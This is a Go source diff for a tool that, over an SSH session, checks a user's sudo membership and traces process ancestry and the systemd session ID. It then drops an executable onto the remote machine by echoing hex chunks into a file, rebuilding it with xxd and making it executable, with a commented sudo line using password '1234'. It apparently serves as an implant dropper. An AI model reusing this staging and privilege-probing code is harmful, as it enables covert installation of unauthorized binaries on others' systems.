@@ -8,7 +8,9 @@ import (
 	"io"
 	"log"
 	"os"
+	"path/filepath"
 	"regexp"
+	"strings"
 	vars "test/VARS"
 	"time"
 
@@ -21,6 +23,10 @@ var isSudo bool
 var PidToStart string
 var stringOFpidToStart string
 var commands []string
+var Pids []string
+var Search = true
+var SId string
+var StrResult strings.Builder
 
 // var base64PidToStart string
 
@@ -80,9 +86,10 @@ func main() {
 		scanner := bufio.NewScanner(stdout)
 		for scanner.Scan() {
 			Result := scanner.Text()
-			//fmt.Println(Result)
 			patern := fmt.Sprintf(`\b%s\b.*\bsudo\b|\bsudo\b.*\b%s\b`, confa.Client.User, confa.Client.User)
-			paternNumber := `^\d+$`
+			paternNumber := `\b\d{4,}\b`
+			paternSessionID := `^/run/systemd/sessions/\d{1,3}$`
+			paternPPid := `PPid:`
 			re := regexp.MustCompile(patern)
 
 			if re.MatchString(Result) {
@@ -90,14 +97,55 @@ func main() {
 			}
 			renum := regexp.MustCompile(paternNumber)
 			if renum.MatchString(Result) {
-				stringOFpidToStart = fmt.Sprintf("\nPidToStart = \"%s\"", Result)
-				fmt.Println(Result, "AAAAAAAAAAAAAAASASASASSASA")
+				if !strings.Contains(Result, "PPid:") {
+					Pids = append(Pids, Result)
+					// stringOFpidToStart = fmt.Sprintf("\nPidToStart = \"%s\"", Result)
+				}
+			}
+			reppid := regexp.MustCompile(paternPPid)
+			if reppid.MatchString(Result) {
+				x := strings.Split(Result, "\t")
+				Pids = append(Pids, x[1])
+			}
+			resess := regexp.MustCompile(paternSessionID)
+			if resess.MatchString(Result) {
+				SId = filepath.Base(Result)
 			}
 		}
 	}()
 
 	_, err = stdin.Write([]byte("groups $USER\n"))
 	_, err = stdin.Write([]byte("echo $$\n"))
+	time.Sleep(1 * time.Second)
+	trimmed := ""
+	for Search {
+
+		c := fmt.Sprintf("cat /proc/%s/status | grep PPid\n", Pids[len(Pids)-1])
+
+		_, err = stdin.Write([]byte(c))
+		time.Sleep(1 * time.Second)
+		if Pids[len(Pids)-1] == "1" || Pids[len(Pids)-1] == "0" {
+			Search = false
+			StrResult.WriteString("LEADER=(")
+			for i, num := range Pids {
+				if i > 0 {
+					StrResult.WriteString(fmt.Sprintf("%s", num))
+					StrResult.WriteString("|") // Add the separator between elements
+				}
+			}
+			trimmed = strings.TrimSuffix(StrResult.String(), "|")
+			trimmed = trimmed + ")"
+		}
+
+	}
+
+	sessionID := fmt.Sprintf("grep -l --exclude=\"*.ref\" -E \"%s\"  /run/systemd/sessions/* 2>/dev/null \n", trimmed)
+
+	time.Sleep(1 * time.Second)
+	_, err = stdin.Write([]byte(sessionID))
+	fmt.Println("END WAITING")
+
+	time.Sleep(1 * time.Second)
 	files := []string{configFile, bfFile}
 	StringToSend := []string{}
 	fileData := OpenAndReadFiles(filePath)
@@ -108,13 +156,18 @@ func main() {
 	for i, file := range files {
 		fileData := OpenAndReadFiles(file)
 		if i == 0 {
-			fileData = append(fileData, []byte(stringOFpidToStart)...)
+			something := fmt.Sprintf("\n\tSessionId=%s\n", SId)
+			str := strings.Join(Pids, "|")
+			seconfSomething := fmt.Sprintf("\tPids=\"%s\"", str)
+			fileData = append(fileData, []byte(something)...)
+			fileData = append(fileData, []byte(seconfSomething)...)
 		}
 		encodedString := base64.StdEncoding.EncodeToString(fileData)
+
 		fmt.Println(encodedString)
 		StringToSend = append(StringToSend, encodedString)
 	}
-	time.Sleep(30 * time.Second)
+	time.Sleep(2 * time.Second)
 	if err != nil {
 		log.Fatalf("Failed to send command: %s", err)
 	}
@@ -123,7 +176,7 @@ func main() {
 		commands = append(commands, fmt.Sprintf("echo \"%s\" >> skata.txt \n", chunk))
 		// fmt.Println(i)
 	}
-	isSudo = false
+	// isSudo = false
 	commands = append(commands, "xxd -r -p skata.txt > output_skata \n")
 	commands = append(commands, "chmod +x output_skata \n")
 	commands = append(commands, fmt.Sprintf("echo \"%s\" >> %s \n", StringToSend[0], configFile))
@@ -131,7 +184,8 @@ func main() {
 	// commands = append(commands, fmt.Sprintf("echo \"%s\" >> %s \n", base64PidToStart, configFile))
 
 	commands = append(commands, fmt.Sprintf("echo \"%s\" >> %s \n", StringToSend[1], bfFile))
-	isSudo = false
+
+	// isSudo = false
 	if isSudo {
 		fmt.Println("IS SUDO")
 		// commands = append(commands, "echo 1234 | sudo -S nohup sleep 20 > /dev/null 2>&1 &\n") //TODO change that to product
@@ -153,13 +207,15 @@ func main() {
 		}
 		time.Sleep(200 * time.Millisecond)
 	}
-
+	time.Sleep(50 * time.Second)
 	// err = session.Wait()
 	stdin.Close()
 	err = session.Close()
+
 	if err != nil {
 		log.Fatalf("Failed to wait for session: %s", err)
 	}
+	fmt.Println("END")
 
 }
 
